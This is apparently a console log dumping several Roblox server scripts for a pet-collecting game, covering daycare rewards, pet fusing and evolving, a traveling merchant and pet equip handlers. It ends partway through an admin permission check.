				for i, v in ipairs({"Triple Coins", "Triple Damage", "Super Lucky", "Ultra Lucky"}) do
					if not rewards[v] then
						rewards[v] = { Min = packedCurr[v],  Max = packedCurr[v], Data = v, Category = "Boost" }
					else
						rewards[v].Min = rewards[v].Min + packedCurr[v]
						rewards[v].Max = rewards[v].Max + packedCurr[v]
					end
				end
			elseif c == "Pet" then
				rewards["pet-1"] = { Data = { id = "2076" }, Min = 0, Max = 0, Category = "Pet" }
				rewards["pet-2"] = { Data = { id = "1019" }, Min = 0, Max = 0, Category = "Pet" }
			end
		end
	end

	packLoot("Currency")
	packLoot("Boost")
	packLoot("Pet")

	local tbl = TableToArray(rewards)
	table.sort(tbl, function(i, v)
		return i.Max > v.Max
	end)

	return tbl 
end

_L.Network.Invoked("Daycare: Enroll").OnInvoke = function(plyr, pets)
	if not _L.Shared.ValidateInteractable(plyr, "Daycare", 100) then
		return false, "You're too far from the Daycare!"
	end

	local save = _L.Saving.Get(plyr)
	if not save then
		return
	end

	local queue = _L.Shared.IsHardcore and save.DaycareHardcoreQueue or save.DaycareQueue
	if not queue then
		return
	end

	if #save.Pets - #pets < 1 then
		return false, "You need atleast 1 pet in your inventory at all times!"
	end

	if #queue + #pets > 10 then
		return false, "no space"
	end

	for i, v in pairs(pets) do
		local pet, owner = _L.Pets.Get(v)
		if not pet or owner ~= plyr then
			return
		end

		table.insert(queue, {
			Pet = pet,
			CreationAge = _L.Shared.ComputeSaveAge(save), --os.time(),
			CreationTime = os.time(),
			id = _L.Functions.GenerateUID()
		})

		_L.Pets.Delete(pet.uid)
	end

	return true, nil, queue
end

local function computeLoot(plyr, pets)
	local rewards = {}

	local function packLoot(c)
		for i, pet in ipairs(pets) do
			if c == "Currency" then
				local mainCurr = getWorldsCurrency(plyr) or "Coins"            
				local calcuDmds = calculateRewards("Currency", pet, "Diamonds")
				local calcuWrldCurr = calculateRewards("Currency", pet, mainCurr) 

				if not rewards["diamonds"] then
					rewards["diamonds"] = { Min = calcuDmds.Min, Max = calcuDmds.Max, Data = "Diamonds", Category = "Currency" }
				else
					rewards["diamonds"].Min = rewards["diamonds"].Min + calcuDmds.Min
					rewards["diamonds"].Max = rewards["diamonds"].Max + calcuDmds.Max
				end

				if not rewards["mainCurr"] then
					rewards["mainCurr"] = { Min = calcuWrldCurr.Min,  Max = calcuWrldCurr.Max, Data = mainCurr, Category = "Currency" }
				else
					rewards["mainCurr"].Min = rewards["mainCurr"].Min + calcuWrldCurr.Min
					rewards["mainCurr"].Max = rewards["mainCurr"].Max + calcuWrldCurr.Max
				end
			elseif c == "Boost" then
				local packedCurr = calculateRewards("Boosts", pet, nil)   

				for i, v in ipairs({"Triple Coins", "Triple Damage", "Super Lucky", "Ultra Lucky"}) do
					if not rewards[v] then
						rewards[v] = { Min = packedCurr[v],  Max = packedCurr[v], Data = v, Category = "Boost" }
					else
						rewards[v].Min = rewards[v].Min + packedCurr[v]
						rewards[v].Max = rewards[v].Max + packedCurr[v]
					end
				end
			elseif c == "Pet" then
				rewards["pet-1"] = { Data = { id = "2076", v = 0.001 }, Min = 0, Max = 0, Category = "Pet" }
				rewards["pet-2"] = { Data = { id = "1019", v = 0.05 }, Min = 0, Max = 0, Category = "Pet" }
			end
		end
	end

	packLoot("Currency")
	packLoot("Boost")
	packLoot("Pet")

	return TableToArray(rewards)
end


_L.Network.Invoked("Daycare: Claim").OnInvoke = function(plyr, pet)
	if not _L.Shared.ValidateInteractable(plyr, "Daycare", 100) then
		return false, "You're too far from the Daycare!"
	end

	local save = _L.Saving.Get(plyr)
	if not save then
		return
	end

	local queue = _L.Shared.IsHardcore and save.DaycareHardcoreQueue or save.DaycareQueue
	if not queue then
		return
	end

	if not pet then
		-- CLAIM ALL --
		local recievingLoot = {}
		local pets = {}
		local fffff = {}
		local nopnonon = 0
		for i, data in pairs(queue) do
			local est = _L.Shared.DaycareComputeRemainingTime(save, data)
			if not ( est > 0 ) then

				local computedLoot = computeLoot(plyr, { data.Pet })
				if computedLoot == false then return false end

				for i, v in ipairs(computedLoot) do
					if v.Category ~= "Pet" then
						table.insert(recievingLoot, {
							Data = v.Data,
							Category = v.Category,
							Min = math.round(RNG:NextNumber(v.Min, v.Max))
						})
					else
						local rew = _L.Functions.Lottery({ {"Pet", v.Data.v}, {" ", 100 - v.Data.v} })
						if rew == "Pet" then
							table.insert(recievingLoot, {
								Data = v.Data,
								Category = "Pet"
							})
						end
					end
				end

				_L.Pets.Create(plyr, data.Pet.id, data.Pet)
				table.insert(pets, data.Pet)

				fffff[i] = true
			else
				nopnonon = nopnonon + 1
			end
		end

		if nopnonon == #queue then
			return false, "no pets to claim"
		end

		for i, v in pairs(fffff) do
			table.remove(queue, i)
			if queue[i] then
				queue[i] = nil
			end
		end

		local loot = {}
		for i, v in ipairs(recievingLoot) do
			local t = true
			for int, tbl in ipairs(loot) do
				if tbl and tbl.Data and v and v.Data and tbl.Data == v.Data then                    
					loot[int].Min = loot[int].Min + v.Min
					t = false
				end
			end
			if t then
				table.insert(loot, v)
			end
		end

		local CoinMult = 1
		if _L.Mastery.HasPerk(plyr, "Daycare", 3) then
			CoinMult = 1.35
		elseif _L.Mastery.HasPerk(plyr, "Daycare", 1) then
			CoinMult = 1.1
		end

		local DiamondMult = 1
		if _L.Mastery.HasPerk(plyr, "Daycare", 4) then
			DiamondMult = 1.5
		end

		local BoosterMult = 1
		if _L.Mastery.HasPerk(plyr, "Daycare", 2) then
			BoosterMult = 1.25
		end

		local rewards = {}
		for i, v in ipairs(loot) do
			if v.Category == "Currency" then
				local mult = v.Data == "Diamonds" and DiamondMult or CoinMult
				_L.Give.Currency(plyr, v.Min * mult, v.Data)
				table.insert(rewards, {v.Data, v.Min * mult})
			elseif v.Category == "Boost" then
				_L.Boosts.Give(plyr, v.Data, v.Min * BoosterMult)
				table.insert(rewards, {v.Data, v.Min * BoosterMult})
			elseif v.Category == "Pet" then
				_L.Pets.Create(plyr, v.Data.id)
				table.insert(rewards, {"HugePet", v.Data.id})
			end
		end

		_L.Network.Fire("Rewards Redeemed", plyr, rewards)

		_L.Mastery.Progress(plyr, "Daycare", daycareMaseryRate*#pets)

		return true, nil, pets, loot, queue
	else
		-- CLAIM ONE --

		local data = queue[pet]

		if _L.Shared.DaycareComputeRemainingTime(save, data) > 0 then
			return false, "You cannot claim this right now!"
		end

		local computedLoot = computeLoot(plyr, { data.Pet })
		if computedLoot == false then return false end
		local recievingLoot = {}

		for i, v in ipairs(computedLoot) do
			if v.Category ~= "Pet" then
				table.insert(recievingLoot, {
					Data = v.Data,
					Category = v.Category,
					Min = math.round(RNG:NextNumber(v.Min, v.Max))
				})
			else
				local rew = _L.Functions.Lottery({ {"Pet", v.Data.v}, {" ", 100 - v.Data.v} })
				if rew == "Pet" then
					table.insert(recievingLoot, {
						Data = v.Data,
						Category = "Pet"
					})
				end
			end
		end

		local CoinMult = 1
		if _L.Mastery.HasPerk(plyr, "Daycare", 3) then
			CoinMult = 1.35
		elseif _L.Mastery.HasPerk(plyr, "Daycare", 1) then
			CoinMult = 1.1
		end

		local DiamondMult = 1
		if _L.Mastery.HasPerk(plyr, "Daycare", 4) then
			DiamondMult = 1.5
		end

		local BoosterMult = 1
		if _L.Mastery.HasPerk(plyr, "Daycare", 2) then
			BoosterMult = 1.25
		end

		local rewards = {}
		for i, v in ipairs(recievingLoot) do
			if v.Category == "Currency" then
				local mult = v.Data == "Diamonds" and DiamondMult or CoinMult

				_L.Give.Currency(plyr, v.Min * mult, v.Data)
				table.insert(rewards, {v.Data, v.Min * mult})
			elseif v.Category == "Boost" then
				_L.Boosts.Give(plyr, v.Data, v.Min * BoosterMult)
				table.insert(rewards, {v.Data, v.Min * BoosterMult})
			elseif v.Category == "Pet" then
				_L.Pets.Create(plyr, v.Data.id)
				table.insert(rewards, {"HugePet", v.Data.id})
			end
		end

		_L.Pets.Create(plyr, data.Pet.id, data.Pet)

		table.remove(queue, pet)

		_L.Network.Fire("Rewards Redeemed", plyr, rewards)

		_L.Mastery.Progress(plyr, "Daycare", daycareMaseryRate)

		return true, nil, {data.Pet}, recievingLoot, queue
	end
end


_L.Signal.Fired("Player Added"):Connect(function(player)
	_G.HasLoaded(player)
	task.wait(2) -- like psx.
	local save = _L.Saving.Get(player)
	if not save then
		return
	end

	local queue = _L.Shared.IsHardcore and save.DaycareHardcoreQueue or save.DaycareQueue
	if not queue then
		return
	end
	
	--local CHECKEDCACHE = {}
	local checked = false
	local function Check()
		for i,v in ipairs(queue) do
			if not v.id then
				v.id = _L.Functions.GenerateUID()
			end
			
			--if CHECKEDCACHE[v.id] then
			--	return
			--end
			if checked then return end
			
			if _L.Shared.DaycareComputeRemainingTime(save, v) < 0  then
				_L.Network.Fire("Notification", player, "You have rewards ready in the Daycare! Go claim them!", { color = Color3.fromRGB(105, 255, 168) })
				--CHECKEDCACHE[v.id] = true
				checked = true
				break
			end
		end
	end
	
	Check()
end)


-- fuse machine
function blacklisted(petData, id)
	if petData.rarity == "Exclusive" or petData.rarity == "Mythical" or petData.rarity == "Event" or petData.rarity == "Secret" or petData.huge or petData.titanic or petData.isGift or not petData.strengthMin or petData.companionEnchantLevel then
		return true
	end

	local blacklistedIds = {}

	if table.find(blacklistedIds, id) then
		return true  
	end

	return false
end

function CheckIfGreater(old, new, allStrength)  
	-- check if normal stat is greater than golden than rainbow --

	allStrength = math.round(allStrength / FuseDecrease)

	local R = _L.Shared.PetTypeMult.Rainbow
	local G = _L.Shared.PetTypeMult.Golden
	if new * R >= old and allStrength > new * R then -- rb
		return true, false, true
	end

	if new * G >= old and allStrength > new * G then -- g
		return true, true, false
	end

	if new >= old and allStrength > new then
		return true, false, false
	end

	return false, false, false
end


function TableToArray(tbl, getIndex)
	local arr = {}
	for i, v in pairs(tbl) do
		if getIndex then v.index = i end
		table.insert(arr, v)
	end
	return arr
end	

_L.Network.Invoked("Fuse Pets").OnInvoke = function(plyr, pets)
	local save = _L.Saving.Get(plyr)
	if not save then
		return
	end

	local masteryAdd = fusingMasteryRate*#pets

	local reqPets = _L.Shared.FuseMinPets
	local maxPets = _L.Shared.FuseMaxPets
	local cost = _L.Shared.IsHardcore and _L.Shared.FuseHardcoreCost or _L.Shared.FusePetsCost
	if save.Diamonds < cost then 
		return false, "You need " .. _L.Functions.Commas(cost - save.Diamonds) .. " more Diamonds"
	end
	if #pets < reqPets or #pets > maxPets then
		return 
	end

	local allStrength = 0
	local hardcore = false
	for i, uid in ipairs(pets) do 
		local pet, owner = _L.Pets.Get(uid)
		if not pet or owner ~= plyr then
			return 
		end

		if pet.hc then
			hardcore = true
		end

		if hardcore and not pet.hc then
			return false, "Some of these pets arent hardcore!"
		end

		allStrength = allStrength + pet.s
	end

	local newestID = nil
	local newestStrength = 0
	local isTooPowerfull = false 
	local isGold = false
	local isRainbow = false

	local petsDir = _L.Directory.Pets

	local tbl = TableToArray(petsDir, true)
	table.sort(tbl, function(i, v)
		return (v.strengthMin or 0) > (i.strengthMin or 0)
	end) 

	for _, petData in ipairs(tbl) do
		if not blacklisted(petData, petData.index) then
			local isGreater, Golden, Rainbow = CheckIfGreater(newestStrength, petData.strengthMin, allStrength)
			if isGreater then
				newestID = petData.index
				isGold = Golden
				isRainbow = isRainbow
			end
		end
	end

	if not newestID then
		return false, "you have max pet"
	end

	for i, v in ipairs(pets) do
		_L.Pets.Delete(v, true)
	end

	purchase(plyr, cost)
	_L.Achievements.Add(plyr, "Fuse Pets", 1)
	if petsDir[newestID].rarity and petsDir[newestID].rarity == "Legendary" then
		_L.Achievements.Add(plyr, "Fuse Pets Legendary", 1)
	end
	local shiny = false
	local chance = 0
	if _L.Mastery.HasPerk(plyr, "Fusing", 3) then
		chance = 1
	elseif _L.Mastery.HasPerk(plyr, "Fusing", 2) then
		chance = 0.5
	elseif _L.Mastery.HasPerk(plyr, "Fusing", 1) then
		chance = 0.2
	end

	coroutine.wrap(function()
		_L.Network.FireAll("Using Fuse Pets Machine", plyr)
	end)()
	
	-- dramatic wait...
	task.wait(MachineDelay)

	local lot = _L.Functions.Lottery({{true, chance},{false,100-chance}})
	shiny = lot == true
	_L.Pets.Create(plyr, newestID, {g = isGold, r = isRainbow, sh = shiny, hc = hardcore})
	_L.Mastery.Progress(plyr, "Fusing", masteryAdd)

	return true
end

-- Evolve machine
_L.Network.Invoked("Attempt Use Evolve Machine").OnInvoke = function(plyr, pets)
	local save = _L.Saving.Get(plyr)
	if not save then
		return nil, "no save"
	end

	if type(pets) ~= 'table' then
		return false, "type not table?"
	end

	_G.ProcessPending(plyr, false)	
	local petsToCompute = {}
	for _, uid in ipairs(pets) do
		local pet, owner = _L.Pets.Get(uid)
		if not pet or owner~=plyr then
			_G.ProcessPending(plyr, true)	
			return nil,"?"
		end

		table.insert(petsToCompute,pet)
	end

	local computed = _L.Shared.ComputeEvolveMachinePets(petsToCompute)
	if not computed then
		_G.ProcessPending(plyr, true)	
		return nil, "no computed"
	end

	local lotteryTbl = {}
	for i, v in pairs(computed) do
		table.insert(lotteryTbl, {i, v})
	end

	local lotteryResult = _L.Functions.Lottery(lotteryTbl)
	local dir = _L.Directory.Pets[lotteryResult]
	if not dir then
		_G.ProcessPending(plyr, true)	
		return false, "No directory"
	end

	local shinyChance = 0
	local rainbowChance = 0

	for i, v in pairs(petsToCompute) do
		if _L.Directory.Pets[v.id].evolve==lotteryResult then
			if v.sh then
				shinyChance = shinyChance+ 20
			end
			if v.r then
				rainbowChance = rainbowChance+ 20
			end
		end
	end

	local isShiny = _L.Functions.Lottery({ {true,shinyChance}, {false,100-shinyChance} })
	local isRainbow = _L.Functions.Lottery({ {true,rainbowChance}, {false,100-rainbowChance} })

	for _, uid in ipairs(pets) do
		_L.Pets.Delete(uid)
	end

	coroutine.wrap(function()
		_L.Network.FireAll("Using Evolve Machine", true)
	end)()
	
	-- dramatic wait...
	task.wait(MachineDelay)

	_L.Eggs.Open(plyr, "Cracked Egg", 1, { { lotteryResult, 100 } }, { {sh = isShiny, r = isRainbow} }, true, true)

	_G.ProcessPending(plyr, true)	
	return true
end  -  Editar
  04:54:13.769    -  Editar
  04:54:13.769  ----- [2337] ServerScriptService.Scripts.Game.StudioAreas -----  -  Editar
  04:54:13.769  -- | library | --
local _L = require(game.ReplicatedStorage.Library) _L.Load()

_L.Signal.Fired("Player Added"):Connect(function(player)
	if _L.RunService:IsStudio() then
		for area in pairs(_L.Directory.Areas) do
			_L.Worlds.GiveArea(player, area)
		end
		local save = _L.Saving.Get(player)
		
		if save then
			save.HackerPortalUnlocked = true
			save.Hardcore.HackerPortalUnlocked = true
		end
	end
end)  -  Editar
  04:54:13.769    -  Editar
  04:54:13.770  ----- [2338] ServerScriptService.Scripts.Game.Merchant -----  -  Editar
  04:54:13.770  --[[
                                                           ,,,,,,╓╓╓╓╓╖
         ,,,,╓╓╓╓╖╥╥╗╗╗╗╗╗╗HH@@@@@@@Ñ╣╣╣╣╢╢╢╣▒▒▒▒▒▒▒▒Ñ╝╜╙╙╙╨╝╢▒▒▒▒▒▒▒▒▒[
         ▒▒▒▒╜╙╙╙╙""""````"╙╨╣▒▒▒▒▒▒[     ║▒▒▒▒▒▒╢╜            ╙╣▒▒▒▒▒▒[
         ▒▒▒▒[                 ║▒▒▒▒[     ║▒▒▒▒▒╜                ╙▒▒▒▒▒╡
         ▒▒▒▒[     ,,,,╓╓       ║▒▒▒╣     ║▒▒▒▒╜     ╓╣▒▒▒▒@,     ╠▒▒▒▒╢
         ▒▒▒▒╢     ]▒▒▒▒▒▒@     ]▒▒▒╢     ]▒▒▒╣     ]▒▒▒▒▒▒▒▒H@╣╢▒▒▒▒▒▒▒
         ╢▒▒▒▒     ]▒▒▒▒▒Ñ`     ╢▒▒▒▒     ]▒▒▒L     ╢▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ║▒▒▒▒                ╓╣▒▒▒▒▒     ]▒▒▒      ▒▒▒▒▒╜╙╙╙╙╙╙"""║▒▒▒▒
         ║▒▒▒▒                 ╙╣▒▒▒▒      ▒▒▒U     ╢▒▒▒▒          ║▒▒▒▒
         ]▒▒▒▒      HH@@@%╗      ╢▒▒▒      ▒▒▒[     ]▒▒▒▒          ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╣     ]▒▒▒      ▒▒▒▒      ║▒▒▒▒▒▒▒╜     ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╜     ]▒▒▒U     ▒▒▒▒╣      `╨ÑÑ╝╜       ]▒▒▒▒U
          ▒▒▒▒U     ``           ╣▒▒▒L     ╢▒▒▒▒╣╖                  ▒▒▒▒[
          ▒▒▒▒[                ╔╣▒▒▒▒[     ║▒▒▒▒▒▒╣╗,        ╓@L ,,,▒▒▒▒[
          ▒▒▒▒[,,,╓╓╓╓╓╓╓╗╗@@╢▒▒▒▒▒▒▒╣@@@@Ñ╣▒▒▒▒▒▒▒▒▒▒▒╢╢║╢ÑÑÑÑ╝╝╝╝╝╝╨╨╜┘
          ╝╝╝╝╝╝╨╨╜╜╙╙╙╙╙╙""""````                    ,,,,,    ,╓╖,
               ,╥@@@╗,    ╥@╣╢╣N,   ╢╣▒▒▒▒╣╗  ║▒▒  ║▒▒▒▒╢╢╢  ╔╣╣╜╙╢▒╣
              ╔▒▒╜╙╙╣▒@  ╢▒╝` ╙▒▒╗  ▒▒[   ▒▒[ ║▒▒  ║▒▒       ╢▒@╖
              ▒▒[       ║▒▒    ]▒▒  ╢▒╢  ╓▒▒[ ]▒▒  ]▒▒╣╣╣╢    "╨╣▒▒╣╗
              ▒▒U       ║▒▒    ]▒▒  ║▒▒▒▒╢Ñ╜  ]▒▒  ]▒▒        ,    ╙▒╢
              ╢▒╣   ╓@╗  ▒▒╗   ╣▒╣  ║▒▒       ]▒▒  ]▒▒╗╗╗m╗m ╙▒╢H╥╗╣▒╝
               ╝▒▒╣╣▒╢╜   ╝▒▒▒▒╢╜   ║▒▒        Ñ╝   ╝╝╝╨╨╜╜╜   `╙╙╙
              
           By: @localonex     
--]]


--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
while (not _L.Loaded) do  game:GetService("RunService").Heartbeat:Wait()  end

--------|     Setting     |--------
local merchantTypeMults = _L.Settings.MerchantTypePriceMults
local merchantRarityMults = _L.Settings.MerchantRarityPriceMults
local secretDiscount = _L.Settings.SecretMerchantDiscount

--------|    Reference    |--------

--------|    Variables    |--------
local RNG = Random.new()
local merchantData = {
	arrived = false,
	isSecret = false,
	departTime = 0,
	Items = {}
}
local secretMerchantActive = false
local lastSecretArrive = nil

--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------

if _L.Shared.IsHardcore then
	return 
end

local function salesToLevel(sales)
    if sales >= _L.Shared.MerchantLevelReq[3] then
        return 3
    end
    
    if sales >= _L.Shared.MerchantLevelReq[2] then
        return 2
    end
    
    if sales >= _L.Shared.MerchantLevelReq[1] then
        return 1
    end
    
    return nil -- error?
end

-- Manual because I am not making a system for this shit. - onex
local possiblePetsData = {
    [1] = {
        petChances = {"534", "535", "533", "538"},
        rarityChances = { {"g", 85}, {"r", 15} },
        discount = { ["Merchant"] = 1,  ["Secret"] = secretDiscount }
    },
    [2] = {
        petChances = {"539", "537"},
        rarityChances = { {"g", 50}, {"r", 50} },
        discount = { ["Merchant"] = 1,  ["Secret"] = secretDiscount }
    },  
    [3] = { 
        petChances = {"530"},
        rarityChances = { {"g", 1.5}, {"r", 98.5} },
        discount = { ["Merchant"] = 1,  ["Secret"] = secretDiscount }
    }
}

local function calculateItems(isSecretMerchant)
    local items = {}
    
    for i = 1, 3 do
        if possiblePetsData[i] then
            local possiblePet = possiblePetsData[i].petChances[RNG:NextInteger(1, #possiblePetsData[i].petChances)]
            local randomRarity = _L.Functions.Lottery(possiblePetsData[i].rarityChances) or "g"
            local discount = possiblePetsData[i].discount[isSecretMerchant and "Secret" or "Merchant"] or 1
            
            local dir = _L.Directory.Pets[possiblePet]
            if not dir then warn("Merchant: Tier ", tostring(i), " | Failed to grab pet directory ⚠️") continue end
            
            local price = _L.Settings.MerchantPriceCeiling 
            local stat = RNG:NextInteger(dir.strengthMin, dir.strengthMax)
            
            if randomRarity == "r" then
                stat = stat * _L.Shared.PetTypeMult.Rainbow
                price = price * merchantTypeMults.Rainbow
            else
                stat = stat * _L.Shared.PetTypeMult.Golden
                price = price * merchantTypeMults.Golden
            end
            
            if merchantRarityMults[dir.rarity] then
                price = price * merchantRarityMults[dir.rarity]
            end
            
            price = price * discount
            
			items["Level "..tostring(i)] = {
                left = RNG:NextInteger(1, 5),
                price = math.round(price) * ( 2 * i ),
                itemType = "Pet",
                req = _L.Shared.MerchantLevelReq[i],
                petId = possiblePet,
                petExtra = {
                    g = randomRarity == "g",
                    r = randomRarity == "r",
                    s = stat,
                    id = possiblePet
                }
            }
            
        else
            warn("Merchant: Tier ", tostring(i), " | Failed to grab data ⚠️")
        end
    end
    
    return items
end

local function merchantArrive(isSecretMerchant)
    merchantData.arrived = true
    merchantData.isSecret = isSecretMerchant == true
    local osDate = os.date("*t")
    local timeHere = isSecretMerchant and _L.Settings.MerchantActive - ( math.round(osDate.min) * 60 ) or _L.Settings.MerchantActive
    local meTime = os.time() + timeHere
    merchantData.departTime = meTime
    merchantData.Items = calculateItems(isSecretMerchant)

    local arrivedText = isSecretMerchant and "Mysterious Merchant" or "Traveling Merchant"
    local arrivedColor = isSecretMerchant and Color3.fromRGB(60, 47, 88) or Color3.fromRGB(46, 255, 63)
    
    coroutine.wrap(function()
        _L.Network.FireAll("Merchant Arrival", merchantData.isSecret)
        _L.Network.FireAll("Chat Msg", arrivedText .. " has arrived!", arrivedColor)
    end)()
    
    return meTime
end

local function departMerchant(isSecretMerchant, d)
    if not isSecretMerchant then -- DEBUG
        --isSecretMerchant = merchantData.isSecret == true
    end
    
    merchantData.arrived = false
    merchantData.isSecret = false
    merchantData.departTime = 0
    merchantData.Items = {}
    
    _L.Network.FireAll("Merchant Departed", d)
    
    local departText = isSecretMerchant and "Mysterious Merchant" or "Traveling Merchant"
    _L.Network.FireAll("Chat Msg", departText .. " has departed!", Color3.fromRGB(163, 162, 165))
end

_L.Network.Invoked("Buy Merchant Item").OnInvoke = function(plyr, item)
    local save = _L.Saving.Get(plyr)
    if not save then 
        return
    end
    
    if not merchantData.arrived or os.time() > merchantData.departTime then
        return false, "The merchant is no longer selling items."
    end
	
	item = "Level "..item	
	
    if not merchantData.Items[item] then
        return
    end
    
    local itemData = merchantData.Items[item]
    if not itemData then
        return nil, "Data issue."
    end
    
    if itemData.left <= 0 then
        return false, "This item is out of stock"
    end
    
    if #save.Pets + 1 > save.MaxSlots then
        return false, "You need more inventory space!"
    end
    
    if save.MerchantSales < itemData.req then
        return false, "You aren't a high enough level to purchase this."
    end
    
    if save.Diamonds < itemData.price then
        return false, "You need " .. _L.Functions.Commas(itemData.price - save.Diamonds) .. " more Diamonds!"
    end
        
    local salesToLevel = salesToLevel(save.MerchantSales)
    if not salesToLevel then
        return nil, "Something went wrong, everything lost will not be refunded :("
    end
    
    save.MerchantSales = save.MerchantSales + 1
    save.MerchantLevel = salesToLevel
    itemData.left = itemData.left - 1
    save.Diamonds = save.Diamonds - itemData.price
    
    _L.Pets.Create(plyr, itemData.petId, itemData.petExtra, nil, true)
    coroutine.wrap(function()
        _L.Network.FireAll("Merchant Updated", merchantData.Items)
    end)()
    
    return true, "Success ✅"
end

_L.Network.Invoked("Get Merchant Items").OnInvoke = function()
    return merchantData.Items or {}
end

_L.Network.Invoked("Is Merchant Here").OnInvoke = function()
    return merchantData.arrived, merchantData.isSecret
end

_L.Network.Invoked("Get Merchant Timer").OnInvoke = function()
    return os.time(), merchantData.departTime
end


coroutine.wrap(function()
    -- TODO: Handle merchant arrival and departure ---
    task.spawn(function()
		while wait(RNG:NextInteger(unpack(_L.Settings.MerchantWait))) do
            if merchantData.Items ~= {} then
                merchantArrive(false)
                wait(_L.Settings.MerchantActive)
                departMerchant(false)
            end
        end 
    end)

    -- TODO: Handle secret merchant arrival and departure ---
    task.spawn(function()
        wait (10) --< debug thing >--
        
        local secretArriveTimes = _L.Settings.SecretMerchantAppearTimes
        while wait(1) do
            --local osDate = os.date("%X")
            --local hour, minute, second = unpack(string.split(osDate, ":"))
			local osDate = DateTime.fromUnixTimestamp(os.time() - (5 * 60 * 60)):ToUniversalTime() --os.date("*t")
            if not osDate.hour then
                return
            end
            local hour, min = osDate.hour, osDate.min
            hour = math.round(hour)
            min = math.round(min)

            --if hour ~= secretArriveTimes[1].hour or hour ~= secretArriveTimes[2].hour then
            if ( hour == 12 or hour == 24 ) and (min <= 10) and lastSecretArrive ~= hour then                
                lastSecretArrive = hour
                departMerchant(false, true) -- remove normal merchant.
                wait(0.2)
                
                local times = merchantArrive(true)
                wait(times)
                departMerchant(true)
            end
        end
    end)
end)()
  -  Editar
  04:54:13.770    -  Editar
  04:54:13.770  ----- [2339] ServerScriptService.Scripts.Game.Pets -----  -  Editar
  04:54:13.770  --[[
                                                           ,,,,,,╓╓╓╓╓╖
         ,,,,╓╓╓╓╖╥╥╗╗╗╗╗╗╗HH@@@@@@@Ñ╣╣╣╣╢╢╢╣▒▒▒▒▒▒▒▒Ñ╝╜╙╙╙╨╝╢▒▒▒▒▒▒▒▒▒[
         ▒▒▒▒╜╙╙╙╙""""````"╙╨╣▒▒▒▒▒▒[     ║▒▒▒▒▒▒╢╜            ╙╣▒▒▒▒▒▒[
         ▒▒▒▒[                 ║▒▒▒▒[     ║▒▒▒▒▒╜                ╙▒▒▒▒▒╡
         ▒▒▒▒[     ,,,,╓╓       ║▒▒▒╣     ║▒▒▒▒╜     ╓╣▒▒▒▒@,     ╠▒▒▒▒╢
         ▒▒▒▒╢     ]▒▒▒▒▒▒@     ]▒▒▒╢     ]▒▒▒╣     ]▒▒▒▒▒▒▒▒H@╣╢▒▒▒▒▒▒▒
         ╢▒▒▒▒     ]▒▒▒▒▒Ñ`     ╢▒▒▒▒     ]▒▒▒L     ╢▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ║▒▒▒▒                ╓╣▒▒▒▒▒     ]▒▒▒      ▒▒▒▒▒╜╙╙╙╙╙╙"""║▒▒▒▒
         ║▒▒▒▒                 ╙╣▒▒▒▒      ▒▒▒U     ╢▒▒▒▒          ║▒▒▒▒
         ]▒▒▒▒      HH@@@%╗      ╢▒▒▒      ▒▒▒[     ]▒▒▒▒          ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╣     ]▒▒▒      ▒▒▒▒      ║▒▒▒▒▒▒▒╜     ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╜     ]▒▒▒U     ▒▒▒▒╣      `╨ÑÑ╝╜       ]▒▒▒▒U
          ▒▒▒▒U     ``           ╣▒▒▒L     ╢▒▒▒▒╣╖                  ▒▒▒▒[
          ▒▒▒▒[                ╔╣▒▒▒▒[     ║▒▒▒▒▒▒╣╗,        ╓@L ,,,▒▒▒▒[
          ▒▒▒▒[,,,╓╓╓╓╓╓╓╗╗@@╢▒▒▒▒▒▒▒╣@@@@Ñ╣▒▒▒▒▒▒▒▒▒▒▒╢╢║╢ÑÑÑÑ╝╝╝╝╝╝╨╨╜┘
          ╝╝╝╝╝╝╨╨╜╜╙╙╙╙╙╙""""````                    ,,,,,    ,╓╖,
               ,╥@@@╗,    ╥@╣╢╣N,   ╢╣▒▒▒▒╣╗  ║▒▒  ║▒▒▒▒╢╢╢  ╔╣╣╜╙╢▒╣
              ╔▒▒╜╙╙╣▒@  ╢▒╝` ╙▒▒╗  ▒▒[   ▒▒[ ║▒▒  ║▒▒       ╢▒@╖
              ▒▒[       ║▒▒    ]▒▒  ╢▒╢  ╓▒▒[ ]▒▒  ]▒▒╣╣╣╢    "╨╣▒▒╣╗
              ▒▒U       ║▒▒    ]▒▒  ║▒▒▒▒╢Ñ╜  ]▒▒  ]▒▒        ,    ╙▒╢
              ╢▒╣   ╓@╗  ▒▒╗   ╣▒╣  ║▒▒       ]▒▒  ]▒▒╗╗╗m╗m ╙▒╢H╥╗╣▒╝
               ╝▒▒╣╣▒╢╜   ╝▒▒▒▒╢╜   ║▒▒        Ñ╝   ╝╝╝╨╨╜╜╜   `╙╙╙
              
           By: @localonex     
--]]


--------|     Setting     |--------

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
while (not _L.Loaded) do  game:GetService("RunService").Heartbeat:Wait()  end

--------|    Reference    |--------

--------|    Variables    |--------

--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------

_L.Network.Fired("Clear Inventory Notifications"):Connect(function(plyr)
	_L.Saving.Get(plyr).InventoryNotifications = 0
end)

_L.Network.Invoked("Lock Pet").OnInvoke = function(plyr, pets)
    for uid, locking in pairs(pets) do
        local pet, owner = _L.Pets.Get(uid)
        if pet and owner == plyr then
			pet.l = locking or false
			_L.Network.FireAll("Pet Update", plyr, pet)
        end     
    end
end

_L.Network.Invoked("Equip Pet").OnInvoke = function(plyr, uid)
	uid = tostring(uid)

	local save = _L.Saving.Get(plyr)
	if not (save) then
		return 
	end
	
	return _L.Pets.Equip(uid)
end

_L.Network.Invoked("Unequip Pet").OnInvoke = function(plyr, uid)
	uid = tostring(uid)

	local save = _L.Saving.Get(plyr)
	if not (save) then
		return 
	end

	return _L.Pets.Unequip(uid)
end

local function hasPerms(plyr)
	local rank = plyr:GetRankInGroup(32485727)

    if _L.Admins.IsAdmin(plyr) then
        return true
    else
        if rank == 5 then
            return true
